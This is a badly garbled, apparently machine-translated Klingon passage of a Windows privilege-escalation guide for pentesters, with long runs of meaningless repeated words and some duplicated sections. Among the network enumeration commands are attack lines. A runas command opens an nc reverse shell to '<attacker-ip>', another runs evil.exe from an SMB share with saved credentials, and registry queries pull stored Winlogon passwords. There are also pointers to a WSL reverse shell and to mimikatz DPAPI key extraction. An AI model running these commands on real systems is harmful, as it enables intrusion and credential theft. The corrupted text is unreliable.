vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' v
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

**tlhIngan Hol:**

QaStaHvIS 'e' yIlo'lu'pu' hosts file vItlhutlh. QaStaHvIS 'e' yIlo'lu'pu' hosts file vItlhutlh.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Network Interfaces & DNS

#### Network Interfaces

A network interface is a connection point that enables a device to connect to a network. In Windows, network interfaces are represented by network adapters. These adapters can be physical (e.g., Ethernet, Wi-Fi) or virtual (e.g., VPN, loopback).

To view the network interfaces on a Windows system, you can use the `ipconfig` command. This command displays information about each network interface, including its IP address, subnet mask, and default gateway.

#### DNS (Domain Name System)

The Domain Name System (DNS) is a hierarchical and decentralized naming system that translates domain names (e.g., www.example.com) into IP addresses. DNS is essential for browsing the internet and accessing websites using their domain names.

In Windows, DNS settings can be configured at both the system level and the network interface level. At the system level, you can configure the DNS servers that the system uses for name resolution. At the network interface level, you can configure specific DNS servers for each network interface.

To view and configure DNS settings in Windows, you can use the `ipconfig` command along with the appropriate parameters. For example, `ipconfig /all` displays detailed information about all network interfaces, including their DNS settings.

#### DNS Cache Poisoning

DNS cache poisoning is a technique used by attackers to corrupt the DNS cache of a target system. By injecting malicious DNS records into the cache, attackers can redirect users to malicious websites or intercept their network traffic.

To protect against DNS cache poisoning, it is important to keep your system and network infrastructure up to date with the latest security patches. Additionally, you can configure your DNS resolver to use DNSSEC (Domain Name System Security Extensions), which provides cryptographic authentication of DNS responses.

#### Conclusion

Understanding network interfaces and DNS is crucial for managing network connectivity and ensuring secure and reliable communication. By familiarizing yourself with these concepts, you can effectively troubleshoot network issues and mitigate potential security risks.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Qap Qoch

**Qap Qoch** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Dochmey** **ghaH** **Dochmey** **Dajatlh** **Dajatlh** **Doch
```bash
netstat -ano #Opened ports?
```
### Routing Table

#### tlhIngan Hol

#### tlhIngan Hol

A routing table is a data structure used by an operating system or a network device to store information about the routes that packets should take to reach their destination. It contains a list of network destinations (IP addresses) and the next-hop IP address or interface through which the packets should be forwarded.

In tlhIngan Hol, a routing table is called **"Qap"**. It is an essential component of a networked system, as it determines the path that network traffic will follow. The routing table consists of multiple entries, each representing a specific network destination.

Each entry in the routing table contains the following information:

- **Destination**: The network destination (IP address or subnet) for which the route is defined.
- **Next Hop**: The next-hop IP address or interface through which the packets should be forwarded.
- **Metric**: A value used to determine the best route when multiple routes to the same destination exist. The route with the lowest metric is chosen.
- **Interface**: The network interface through which the packets should be forwarded.

The routing table is consulted by the operating system or network device whenever a packet needs to be sent. It is used to determine the best route for the packet based on the destination IP address. The packet is then forwarded to the next-hop IP address or interface specified in the routing table entry.

#### English

A routing table is a data structure used by an operating system or a network device to store information about the routes that packets should take to reach their destination. It contains a list of network destinations (IP addresses) and the next-hop IP address or interface through which the packets should be forwarded.

In English, a routing table is called **"Routing Table"**. It is an essential component of a networked system, as it determines the path that network traffic will follow. The routing table consists of multiple entries, each representing a specific network destination.

Each entry in the routing table contains the following information:

- **Destination**: The network destination (IP address or subnet) for which the route is defined.
- **Next Hop**: The next-hop IP address or interface through which the packets should be forwarded.
- **Metric**: A value used to determine the best route when multiple routes to the same destination exist. The route with the lowest metric is chosen.
- **Interface**: The network interface through which the packets should be forwarded.

The routing table is consulted by the operating system or network device whenever a packet needs to be sent. It is used to determine the best route for the packet based on the destination IP address. The packet is then forwarded to the next-hop IP address or interface specified in the routing table entry.
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP jImej

The Address Resolution Protocol (ARP) is a protocol used to map an IP address to a physical (MAC) address on a local network. The ARP table, also known as the ARP cache, is a table that stores the mappings between IP addresses and MAC addresses.

The ARP table is maintained by the operating system and is used to efficiently route network traffic. When a device needs to send data to another device on the same network, it checks the ARP table to find the MAC address associated with the destination IP address. If the MAC address is not found in the table, the device will send an ARP request to the network asking for the MAC address of the destination device. Once the response is received, the MAC address is added to the ARP table for future use.

The ARP table can be viewed using the `arp` command in Windows. This command displays the IP address, MAC address, and type of each entry in the ARP table. It can be useful for troubleshooting network connectivity issues or for identifying potential security threats, such as ARP spoofing attacks.

To view the ARP table in Windows, open a command prompt and type the following command:

```
arp -a
```

This will display the ARP table, showing the IP address, MAC address, and type of each entry. The type field indicates whether the entry is dynamic (learned through ARP requests) or static (manually added to the table).

It's important to regularly monitor the ARP table for any suspicious entries, as ARP spoofing attacks can be used to intercept network traffic and launch other malicious activities. If any suspicious entries are found, it's recommended to investigate and take appropriate actions to mitigate the threat.
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### qo'noS qo'noS

[**'ejwI'vam vItlhutlh**](../basic-cmd-for-pentesters.md#firewall) **(rul, rul, qo'noS, qo'noS...)**

More[ network enumeration commands here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

If you get root user you can listen on any port (the first time you use `nc.exe` to listen on a port it will ask via GUI if `nc` should be allowed by the firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
### Windows Credentials

#### Winlogon Credentials

To easily start bash as root, you can try `--default-user root`

You can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
**Windows** can **log in the users automatically** by storing their credentials for servers, websites, and other programs in the Windows Vault. This feature allows users to store credentials for Facebook, Twitter, Gmail, etc., so that they can automatically log in through browsers. However, the Windows Vault is not limited to these types of credentials.

The Windows Vault is designed to store credentials that can be used by **Windows applications** to access resources such as servers or websites without requiring users to enter their username and password every time. To utilize the Windows Vault, applications need to interact with the Credential Manager and request the credentials for a specific resource from the default storage vault.

To view the stored credentials on a machine, you can use the `cmdkey` command.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
vaj runas /savecred vaj vay' remote binary via SMB share. 

--- 

#### Klingon Translation:

vaj 'ej `/savecred` qaybtaHvIS runas vay' vaj vay' remote binary via SMB share. 

---
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
### Using `runas` with a provided set of credential.

#### Description:

The `runas` command in Windows allows you to run a program with different user credentials. This can be useful for performing tasks that require elevated privileges or for running programs as a different user.

#### Syntax:

```
runas /user:<username> <command>
```

- `<username>`: The username of the account you want to run the command as.
- `<command>`: The command or program you want to run.

#### Example:

```
runas /user:Administrator cmd.exe
```

This example will open a new command prompt window with the credentials of the `Administrator` account.

#### Notes:

- When using `runas`, you will be prompted to enter the password for the specified user account.
- The user account you specify must have the necessary permissions to run the command or program.
- Be cautious when using `runas` as it can potentially expose sensitive information if used improperly.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
### DPAPI

**Data Protection API (DPAPI)** jup 'e' method vItlhutlh encryption symmetric, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. vItlhutlh encryption leverages user or system secret to significantly contribute to entropy.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. vItlhutlh encryption scenarios involving system, it utilizes the system's domain authentication secrets.

Encrypted user RSA keys, by using DPAPI, are stored in the `%APPDATA%\Microsoft\Protect\{SID}` directory, where `{SID}` represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security\_Identifier). **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, typically consists of 64 bytes of random data. (It's important to note that access to this directory is restricted, preventing listing its contents via the `dir` command in CMD, though it can be listed through PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz module** `dpapi::masterkey` **ghItlh** **arguments** (`/pvk` **je** `/rpc`) **vItlhutlh** **ghItlh**.

**credentials files protected by the master password** **ghItlh** **yIqIm** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan 